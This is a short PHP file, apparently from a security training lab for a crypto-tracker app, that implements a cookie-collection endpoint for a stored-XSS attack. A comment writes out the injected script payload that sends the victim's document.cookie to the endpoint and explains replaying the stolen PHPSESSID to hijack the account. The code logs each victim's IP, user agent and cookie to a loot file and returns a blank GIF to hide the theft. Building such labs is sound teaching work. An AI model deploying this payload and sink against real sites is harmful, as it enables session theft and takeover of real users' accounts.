<?php
// collect.php — stored-XSS exfiltration sink (lab only).
//
// The stored-XSS payload injected into a holding's notes runs on the victim's
// dashboard and calls:
//     <script>new Image().src="http://localhost/crypto-tracker/attacker/collect.php?c="+document.cookie</script>
// Because the app's session cookie is NOT HttpOnly, document.cookie includes
// PHPSESSID, so this endpoint captures the victim's live session. The attacker
// can then replay that PHPSESSID to hijack the account (no password needed).
//
// Every hit is appended to loot/cookie.txt, which is bind-mounted to
// ./attacker-loot/cookie.txt on the host.

$cookie = $_GET['c'] ?? '';

$lootDir = __DIR__ . '/loot';
if (!is_dir($lootDir)) {
    @mkdir($lootDir, 0777, true);
}

$line = sprintf(
    "[%s] ip=%s ua=%s cookie=%s\n",
    date('Y-m-d H:i:s'),
    $_SERVER['REMOTE_ADDR'] ?? '?',
    $_SERVER['HTTP_USER_AGENT'] ?? '?',
    $cookie
);
@file_put_contents($lootDir . '/cookie.txt', $line, FILE_APPEND | LOCK_EX);

// Return a silent 1x1 transparent GIF so the victim's <img> load looks normal.
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
